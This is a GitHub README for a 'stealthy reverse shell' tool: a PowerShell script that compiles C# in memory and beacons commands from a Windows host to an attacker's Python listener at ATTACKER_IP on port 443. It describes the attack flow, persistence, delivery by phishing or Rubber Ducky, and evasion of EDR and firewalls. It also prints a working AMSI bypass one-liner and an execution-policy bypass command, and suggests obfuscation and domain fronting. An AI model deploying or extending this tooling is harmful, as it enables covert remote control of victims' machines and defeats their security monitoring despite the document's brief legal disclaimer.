# Stealthy Reverse Shell Attack: In-Memory C# Beaconing

## Overview

This attack implements a stealthy reverse shell mechanism designed to establish persistent, intermittent command-and-control (C2) communications between a compromised Windows host and an attacker's server. The payload is a PowerShell script (`payload.ps1`) that compiles and runs a C# program in-memory, creating a reverse TCP shell that connects to the attacker's listener (hosted via a Python server on `server.py`). 

Key features include:
- **In-memory C# execution**: No disk writes; the C# code is compiled and executed directly in PowerShell to evade basic antivirus detection.
- **Periodic reconnections**: The client attempts to connect every 10-100 seconds (randomized) to simulate legitimate network activity and avoid detection.
- **Hidden execution**: All commands run without visible windows or prompts on the target.
- **Simple C2 protocol**: The server sends a single command per connection, receives output, and closes the session, minimizing exposure time.

This technique is useful for post-exploitation scenarios where persistence and stealth are priorities. **Warning**: This is for educational, authorized penetration testing, or red teaming purposes only. Unauthorized use may violate laws and ethical guidelines.

## How It Works

### Client Side (payload.ps1)
The PowerShell script embeds C# source code as a here-string (`@"..."@`) that defines a `ReverseShellCs` namespace with a `Program` class. When executed, it leverages PowerShell's integration with the .NET runtime for seamless in-memory compilation and execution. Here's a deeper technical breakdown:

1. **In-Memory C# Compilation and Execution**:
   - PowerShell's `Add-Type` cmdlet is the core enabler here. It accepts C# source code as a string and compiles it into a .NET assembly dynamically at runtime, without requiring an external compiler like `csc.exe` or Visual Studio.
   - **Why no external compiler?** Windows hosts the .NET Framework (or .NET Core/.NET 5+ on modern systems), which includes built-in compilation capabilities via the `Microsoft.CSharp.CSharpCodeProvider` (in .NET Framework) or the Roslyn compiler (`Microsoft.CodeAnalysis.CSharp`) in newer versions. `Add-Type` invokes this provider to parse the C# syntax, resolve references to core .NET assemblies (e.g., `System`, `System.Net`), generate IL (Intermediate Language) bytecode, and load the resulting assembly into the current PowerShell session's AppDomain (application domain).
   - This process is entirely memory-resident: The assembly is JIT-compiled (Just-In-Time) by the CLR (Common Language Runtime) when methods are first invoked, and execution occurs within the PowerShell host process (`powershell.exe` or `pwsh.exe`). No temporary files are written to disk, reducing forensic footprints and bypassing file-based AV signatures.
   - Once compiled, `[ReverseShellCs.Program]::Main()` is invoked statically, entering an infinite loop. This static method call binds to the loaded type via reflection under the hood, ensuring the beacon runs as a background thread in the PowerShell process.

2. **Periodic Connection Attempts**:
   - The `Main()` loop calls `GetRandomSeconds()`, which uses `System.Random` (seeded by system time) to generate a pseudo-random integer between 10,000 and 99,999 ms (10-100 seconds). Randomization introduces jitter to evade time-based heuristics in EDR (Endpoint Detection and Response) tools.
   - `Thread.Sleep()` blocks the current thread (PowerShell's main thread) for the duration, suspending execution without consuming CPU. This low-resource behavior mimics idle processes.
   - The loop then invokes `Connect("ATTACKER_IP")`, attempting outbound TCP on port 443. If the server is unreachable (e.g., firewall block or offline), a `SocketException` is thrown silently (uncaught in this implementation), and the loop continues after the next sleep—ensuring resilience without logging errors.

3. **Reverse Shell Connection (`Connect` method)**:
   - Uses `System.Net.Sockets.TcpClient` to create a synchronous TCP client socket, resolving the IP via DNS (or direct IP) and establishing a connection with a 21-second default timeout (configurable via `TcpClient` constructor).
   - Retrieves the `NetworkStream` for bidirectional I/O. Reads up to 256 bytes into a fixed `Byte[]` buffer using `stream.Read()`, which blocks until data arrives or EOF. Decodes via `System.Text.Encoding.ASCII.GetString()`, trimming trailing newlines—assuming the server sends ASCII-encoded commands.
   - If valid input is read (non-empty after trim), it passes the string to `Exec()`. The output is UTF-8 encoded back to bytes and written via `stream.Write()`, which is blocking until flushed.
   - Explicitly closes the stream (`stream.Close()`) and client (`tcpClient.Close()`), triggering TCP FIN packets for graceful shutdown. This short-lived connection (typically <5 seconds) minimizes dwell time.

4. **Command Execution (`Exec` method)**:
   - Leverages `System.Diagnostics.Process` to spawn a child process for isolation—preventing direct execution in the parent PowerShell session, which could leak variables or trigger AMSI (Antimalware Scan Interface) scans more readily.
   - **Process Configuration Details**:
     - `FileName = "powershell.exe"`: Targets the system's PowerShell host (falls back to .NET Core if available).
     - `Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"<cmd>\""`: Skips profile loading (`-NoProfile`) for speed/stealth, overrides execution policy to `Unrestricted`, and injects the command as a quoted string. The inner quotes are escaped to handle spaces/special chars.
     - `UseShellExecute = false`: Runs without shell integration (e.g., no COMSPEC env var inheritance issues).
     - `RedirectStandardOutput = true` and `RedirectStandardError = true`: Pipes streams to memory via `StreamReader` equivalents, avoiding console I/O.
     - `WindowStyle = ProcessWindowStyle.Hidden` and `CreateNoWindow = true`: Suppresses GUI creation by setting Win32 flags like `CREATE_NO_WINDOW` in the underlying `CreateProcess` API call, ensuring no taskbar flicker or visible cmd/pwsh windows.
   - `process.Start()` launches asynchronously, then `WaitForExit()` blocks until completion (with optional timeout). Reads all output/error via `ReadToEnd()`, concatenating them—useful for commands mixing stdout/stderr (e.g., errors in `dir` on invalid paths).
   - **Security Note**: This spawns a new PowerShell instance per command, inheriting the parent's security context (e.g., user token). On UAC-elevated systems, it won't auto-escalate; for priv-esc, prepend commands like `Start-Process -Verb RunAs`.

The client design enforces one command per connection, aligning with beaconing patterns (e.g., like Cobalt Strike). Unhandled exceptions (e.g., invalid commands) bubble up silently, preventing crashes that could alert via Windows Event Logs.

**Customization Notes**:
- Replace `"ATTACKER_IP"` in the `Connect` call with your actual IP address (supports DNS resolution for DGA-like evasion).
- The sleep range (10-100 seconds) can be adjusted in `GetRandomSeconds()` for different stealth levels (e.g., longer intervals for lower profile; use `Guid.NewGuid().GetHashCode()` for better entropy).
- The `Exec` method uses PowerShell for command execution but could be swapped to `cmd.exe` for compatibility (change `FileName` and adjust args to `/c <cmd>`). For AMSI bypass, inject `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` pre-execution.

### Server Side (server.py)
The Python listener acts as the C2 server, binding to `0.0.0.0:443` to accept incoming connections from the client. It uses the standard library's `socket` module for low-level TCP handling.

1. **Setup and Listening**:
   - `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` creates an IPv4 TCP socket.
   - `setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)` allows immediate rebinding post-crash, avoiding "Address already in use" errors.
   - `bind()` and `listen()` configure the endpoint; backlog defaults to 1 (fine for single-client beacons).
   - Infinite loop with `accept()` blocks for new connections, logging peer addr via `getsockname()`.

2. **Handling Connections**:
   - Context manager (`with conn:`) ensures auto-close on exceptions.
   - `input("Shell> ")` provides interactive prompt; handles `KeyboardInterrupt`/`EOFError` for graceful exit.
   - Empty commands are skipped to avoid null executions.

3. **Command Transmission**:
   - `conn.sendall((cmd + "\n").encode())` sends ASCII bytes atomically (handles partial sends).
   - `conn.shutdown(socket.SHUT_WR)` closes the write half immediately after send, sending a FIN and 0-byte read signal to the client—critical for the client's blocking `Read()` to unblock and proceed to `Exec()` without waiting indefinitely.

4. **Receiving Output (`recv_all` function)**:
   - Sets `settimeout(30.0)` for non-blocking reads with a cap to prevent hangs.
   - Loops `recv(4096)` (optimal MTU-aligned size) until empty chunk (EOF) or timeout, concatenating via `+=` (inefficient for huge outputs but fine for shell cmds <1MB).
   - `finally: conn.settimeout(None)` restores blocking mode.
   - Decodes with `utf-8` and `errors="replace"` for robustness (e.g., non-UTF chars from binaries), then normalizes line endings with `str.replace("\r\n", "\n").rstrip()`.

5. **Output Display (`pretty_print` function)**:
   - Simple string formatting with line count via `splitlines()`.
   - Handles empty output gracefully.

The server aligns with the client's ephemeral model, processing one cmd per conn. Error handling covers `BrokenPipeError` (client-side close during send).

**Running the Server**:
- Requires Python 3.x (no external libraries needed).
- Run with `python server.py` (elevated privileges may be needed for port 443 on some systems; use `sudo` on Linux/Mac).
- Enter commands interactively; output is displayed in real-time.

### Attack Flow
1. **Deployment**: Execute `payload.ps1` on the target Windows machine (e.g., via phishing, lateral movement, or initial access). It runs silently in the background.
2. **Persistence**: The infinite loop ensures the shell "phones home" periodically, even after reboots if the script is scheduled (e.g., via Task Scheduler).
3. **Interaction**: Start `server.py` on your machine. When the client connects (after random delay), enter a command (e.g., `whoami`, `dir`, or complex PowerShell like `Get-Process`).
4. **Execution and Response**: Client receives/executes the command hidden, sends output back, and disconnects. Server displays results.
5. **Stealth**: Short connections on port 443 mimic HTTPS, and random timing reduces anomaly detection. No persistent socket keeps the footprint small.

*Note: You can also execute this attack using a Hak5 Rubber Ducky or a Raspberry Pi Pico set up as a Rubber Ducky (Ducky Scripts provided in this repository).*

### Detection Evasion
- **In-Memory C#**: Avoids file-based indicators; detection relies on memory scanning (e.g., via ETW hooks) or PowerShell logging (Module/Transcription). `Add-Type` usage can be hooked by Sysmon or EDR rules.
- **Randomization**: Sleep intervals prevent rhythmic network patterns; consider adding Gaussian jitter for advanced mimicry.
- **Hidden Processes**: No visible windows; output capture prevents console leaks. Child processes inherit parent PID, blending into process trees.
- **Port 443**: Bypasses some firewalls that allow outbound HTTPS. For deeper evasion, tunnel over HTTP/2 or use domain-fronting.
- Potential Weaknesses: Network monitoring for unusual TCP patterns (e.g., small payloads on 443), PowerShell AMSI if not bypassed, or endpoint detection rules for `Add-Type` usage. Mitigate with obfuscation (e.g., string concatenation in C#) or AMSI patches.

## Proof of Concept (PoC)

Place the GIF demonstrating the attack here (e.g., showing server startup, client execution, command input, and output reception):

![PoC GIF](https://github.com/kUrOSH1R0oo/Stealthy-Reverse-Shell-Attack-In-Memory-C-Beaconing/blob/main/Proof-of-Concept.gif)

## Usage Instructions

### Prerequisites
- **Target**: Windows machine with PowerShell 3+ (most modern Windows versions).
- **Attacker**: Machine with Python 3.x; ensure port 443 is open/forwarded if behind NAT.
- Network: Target must reach attacker's IP on port 443 (firewall exceptions may be needed).

### Deployment Steps
1. **Prepare Payload**:
   - Edit `payload.ps1`: Replace `"ATTACKER_IP"` with your public/external IP.
   - Optionally obfuscate the script (e.g., encode as base64 and run with `powershell -EncodedCommand`).

2. **Start Listener**:
   - Run `python server.py` on your machine.
   - It will listen and prompt for commands.

3. **Execute on Target**:
   - Transfer and run `payload.ps1` (e.g., `powershell -ExecutionPolicy Bypass -File payload.ps1`).
   - The script starts the loop immediately.

4. **Interact**:
   - Wait for the first connection (up to ~100 seconds).
   - Enter commands like `ipconfig`, `net user`, or `Invoke-WebRequest -Uri http://example.com`.
   - View formatted output on the server.

5. **Cleanup**:
   - Kill the PowerShell process on the target (e.g., via Task Manager or `Stop-Process`).
   - Stop the server with Ctrl+C.

### Example Session
```
Listening on 0.0.0.0:443 ...
Waiting for client to connect (one command per connection)...
[+] Connected by ('192.168.1.100', 12345)
Shell> whoami
--- Command: whoami ---
target\user

--- End (1 lines) ---

[*] Command handled — connection closed by server or client.

Waiting for client to connect (one command per connection)...
```

## Limitations and Improvements
- **Single Command per Connect**: Limits to one-off commands; for interactive shells, extend to a loop (but increases detection risk via longer sockets).
- **No Encryption**: Plain TCP; add TLS (e.g., via stunnel or .NET's `SslStream`) for obfuscation.
- **Error Handling**: Basic; client doesn't retry failed executes. Enhance `Exec` for better stderr parsing or add try-catch for logging.
- **Platform**: Client is Windows-only (C#/PowerShell); server is cross-platform.
- **Improvements**:
  - Integrate beaconing payloads (e.g., upload files via `System.Net.WebClient`).
  - Use DNS for C2 to evade firewalls (e.g., TXT records for cmds).
  - Obfuscate C# code or use reflection for anti-analysis (e.g., `MethodInfo.Invoke`).

## Legal and Ethical Notes
This code is provided for defensive security research and authorized testing. Always obtain explicit permission before testing on systems you do not own. Misuse can lead to legal consequences under laws like the Computer Fraud and Abuse Act (CFAA).

## Author
Kur0Sh1ro
